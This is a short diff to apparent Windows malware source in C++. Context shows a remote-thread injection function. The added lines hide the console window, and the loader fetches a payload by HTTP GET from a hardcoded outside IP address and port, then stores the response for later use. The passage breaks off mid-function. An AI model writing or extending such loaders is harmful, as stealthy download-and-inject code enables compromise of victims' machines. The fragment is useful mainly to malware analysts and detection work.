@@ -475,8 +475,10 @@ BOOL WINAPI MyCreateRemoteThread(DWORD dwProcessId,char buf) {
 
 }*/
 int main(int argc, CHAR* argv[]) {
+    HWND hwndDOS = GetForegroundWindow();
+    ShowWindow(hwndDOS, SW_HIDE);
     HttpRequest httpReq("101.42.175.89", 65523);
-    std::string res = httpReq.HttpGet("/d");
+    std::string res = httpReq.HttpGet("/h");
     std::string str_orign = "vwxyz123456789011111111";
     str_orign = res;
 
